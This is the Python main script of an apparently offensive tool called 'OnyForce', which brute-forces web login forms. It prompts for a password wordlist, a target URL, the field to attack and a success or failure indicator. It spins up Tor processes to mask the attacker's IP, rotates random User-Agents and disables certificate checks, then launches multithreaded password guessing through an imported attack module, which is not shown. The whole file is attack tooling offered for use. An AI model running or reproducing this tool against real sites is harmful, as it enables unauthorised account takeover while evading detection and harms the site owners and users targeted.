#!/usr/bin/env python3

import os
import questionary
import colorama
import requests
import logging
import sys


from dependincies import create_tor
from dependincies import start_attack

from fake_useragent import UserAgent
from time import sleep
from multiprocessing import cpu_count


logging.getLogger("urllib3").setLevel(logging.WARNING)
if len(sys.argv) == 2:
    if sys.argv[1] == '--debug' or sys.argv[1] == '-d':
        logging.basicConfig(level=logging.DEBUG, format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')

    else:
        logging.basicConfig(level=logging.DEBUG, format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s %(levelname)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET}] [%(asctime)s, %(lineno)d] %(message)s')

else:
    logging.basicConfig(level=logging.INFO,
                        format=f'[{colorama.Fore.MAGENTA + colorama.Style.BRIGHT}%(funcName)s{colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET} %(levelname)s] [%(asctime)s, %(lineno)d] %(message)s')



os.system('cls||clear')
os.system('figlet "OnyForce" | lolcat')

logging.debug('Debug mode on!')

BRIGHT = colorama.Style.BRIGHT
RESET = colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET
RED = colorama.Fore.RED
BLUE = colorama.Fore.BLUE
CYAN = colorama.Fore.CYAN
WHITE = colorama.Fore.WHITE
RUNNING = 1



def get_header_with_random_user_agent():
    ua = UserAgent()
    headers = {
        'User-Agent': ua.random
    }

    return headers




while RUNNING:
    file_path: os.path = questionary.path('Path of the passwords file: ').ask()
    if not os.path.exists(file_path):
        logging.error(RED + BRIGHT + 'Path does not exits' + RESET)
        continue

    try:
        number_of_threads: int = int(questionary.text('Number of threads to use: ', default=str(cpu_count())).ask())
    except ValueError:
        logging.error(RED + BRIGHT + 'Please input a number' + RESET)
        continue


    tor: bool = bool(questionary.confirm('Do you want to use TOR to mask your IP address').ask())
    if tor:

        create_tor.Make_tor_processes(number_of_threads)
        tor_ports = [i + 10000 for i in range(number_of_threads)]
        sleep(2)
        print()

    indicator: str = questionary.text('A text in the website that indicates a successful / unsuccessful attempt, For example uIncorrect / sCorrect: ').ask()

    if not indicator.startswith('u') and not indicator.startswith('s'):
        logging.error(RED + BRIGHT + 'Indicator must start with an s for messages that appear when successful and u for messages that appear when unsuccessful' + RESET)
        continue

    url: str = questionary.text('The URL of the form you wish to attack: ').ask()
    logging.debug('Checking connection to website')
    try:
        if tor:
            response = requests.post(url, data={'Some': 'random', 'data': 'for_testing'}, timeout=10,
                                     headers=get_header_with_random_user_agent(), verify=False,
                                     proxies={'http': f'socks5h://127.0.0.1:{tor_ports[0]}', 'https': f'socks5h://127.0.0.1:{tor_ports[0]}'})

        else:
            response = requests.post(url, data={'Some': 'random', 'data': 'for_testing'}, timeout=10,
                                     headers=get_header_with_random_user_agent(), verify=False)


        if indicator.startswith('u') and indicator.replace('u', '') not in response.text:
            print()
            logging.error(f'{RED}{BRIGHT}While trying to test the connection to the URL you provided ({url}) it seems that the conditional statement ({indicator.replace("u", "")}) that you provided is not in the website which should mean the script made a successful attempt in logging in but it did not, that either means if you are using TOR that the website blocks TOR or you misconfigured the script please check and try again.{RESET}')
            RUNNING = 0
            break

        elif response.status_code == 200:
            pass


        else:
            if bool(questionary.confirm(f'The website returned a non-valid status code "{response.status_code}" which if you are using TOR could mean that the website is blocking your requests, do you wish to continue anyway?').ask()):
                pass
            else:
                RUNNING = 0
                break

    except requests.ConnectionError:
        logging.error(f'{RED}{BRIGHT}Connection to {url} timed-out terminating.{RESET}')
        exit(1)

    fields = questionary.text('The field(s) that are required to form the request with their value separated by column (:), if more than one please separate them by a comma if none press enter (without the one that is going to be attacked): ').ask()


    if not fields:
        fields_dictionary = {}

    else:
        fields = fields.split(',')
        fields_dictionary = {}

        for field in fields:
            key, value = field.split(':')
            key = key.replace('"', '').strip()
            key = key.replace("'", '').strip()
            value = value.replace('"', '').strip()
            value = value.replace("'", '').strip()
            fields_dictionary[key] = value
        logging.debug(fields_dictionary)




    field_to_attack = questionary.text('The field you wish to brute-force: ').ask()
    if not field_to_attack:
        logging.error(f'{RED}{BRIGHT}Please specify the field to attack{RESET}')
        continue


    with open(file_path, 'r', errors='ignore') as p:
        passwords = p.readlines()
        passwords = [password.strip() for password in passwords]

    Attack = start_attack.Initiate_attack(tor, fields_dictionary, field_to_attack, url, indicator,
                                          number_of_threads - 1, passwords)
    Attack.create_threads()
    break

